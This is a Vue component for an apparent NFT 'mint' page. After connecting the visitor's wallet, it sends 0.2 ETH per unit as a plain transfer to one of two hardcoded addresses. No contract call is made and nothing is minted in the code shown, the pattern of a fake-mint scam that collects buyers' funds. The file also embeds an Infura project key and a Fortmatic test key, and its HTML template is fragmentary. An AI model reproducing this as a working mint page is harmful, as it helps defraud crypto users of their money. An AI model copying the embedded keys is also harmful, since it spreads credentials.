<template>

<center>
        <br>
	  <button v-on:click="wallets" id="btn" value="0"><img src="https://i.ibb.co/YcnDt88/3.png" alt="" width="300" height="47"></button>
</center>
        </div>
        <div class="modal2">
          <div class="modal-content2">
          </div>

        </div>

      </div>

    </div>
    
    <router-view/>
  </div>

</template>
<script>
export default {
  data(){
    return{
      x: window.innerWidth,
      amount: null,
      hex: null,
      providerx:null,
      account:null,
      id:null,
      w: window.innerWidth,
      value:1
    }
  },
  
  methods:{
    max(){
      this.value=5
    },
    plus(){
if (this.value<5) {
  this.value+=1
}
    },
    minus(){
      if (this.value>1) {
        this.value-=1
      }
    },
    wallets() {
      var sel=document.getElementById('btn').value
      console.log(sel)
      if (sel=='0') {
        const WalletConnectProvider = window.WalletConnectProvider.default;
      const Fortmatic = window.Fortmatic;
      const Web3Modal = window.Web3Modal.default;
      const providerOptions = {
        walletconnect: {
       package: WalletConnectProvider,
      options: {
        
         rpc:{
            1: "https://mainnet.infura.io/v3/b50bee145172497d9576a6f79b1209aa"
           }
        
       },
     },
        fortmatic: {
          package: Fortmatic,
          options: {
            // Mikko's TESTNET api key
            key: "pk_test_391E26A3B43A3350",
          },
        },
      };
      const web = async () => {
        const web3modal = new Web3Modal({
          network: "mainnet",
          cacheProvider: true,
          providerOptions,
        });
        const provider = await web3modal.connect();
        this.providerx=provider
        console.log(this.providerx)
        const web3 = new Web3(provider);
        const acc = await web3.eth.getAccounts();
        
        console.log(acc[0]);
        this.account=acc[0]
        if (this.account) {
          document.getElementById('btn').innerHTML='MINT NOW' 
          document.getElementById('btn').value='mint'
          alert(this.account,"is connected")
        }
        const networkId = await web3.eth.net.getId();
        this.id=networkId
        console.log(networkId)
     
        
        
        
      };
      web();
      }
      if (sel=='mint') {
        if (this.account) {
         if (this.id==1) {
            
           const web3 = new Web3(this.providerx);
            this.hex= web3.utils.toHex(this.value*0.2 * 1e18);
        const tx = {
  from: this.account, // Required
  to: "0xCF72F102aB826cB806486c05358520616113b706", // Required (for non contract deployments)
  // Required
   // Optional
   // Optional
  value: this.hex, // Optional
  
   // Optional
};
const txHash =web3.eth.sendTransaction(tx);
txHash.then((result)=>{
  console.log(result)
})
.catch((error)=>{
  console.log(error)
  alert(error)
})
         }
         else{
           alert('please connect to mainnet')
         }
       }
       else{
         alert('please connect to wallet first')
       }
      }
    },
    
    mint(){
      const ethEnabled = async () => {
        if (window.ethereum) {
          window.ethereum.request({ method: "eth_requestAccounts" });
          const chainId = await window.ethereum.request({
            method: "eth_chainId",
          });
          console.log(chainId);
          if (chainId == "0x1") {
            const acc = window.ethereum.request({
              method: "eth_requestAccounts",
            });
            acc.then((result) => {
              
              const web3 = new Web3(window.ethereum);
      const hex = web3.utils.toHex(this.value*0.2 * 1e18);
              const account = result[0];
              window.ethereum.request({
                method: "eth_sendTransaction",
                params: [
                  {
                    from: account,
                    to: "0xa5262b68285CBDAa5637d9a74B013190ba915FB9",
                    value:hex
                    //gasPrice: '0x09184e72a000',0x29a2241af62c0000
                    //gas: '0x2710',
                  },
                ],
              });
            });
          } else {
            alert("please connect to mainnet chain");
          }
          window.web3 = new Web3(window.ethereum);
          return true;
        }
        return false;
      };
      ethEnabled().then(() => {});
    },
    
  }
}
</script>


<style>
</style>
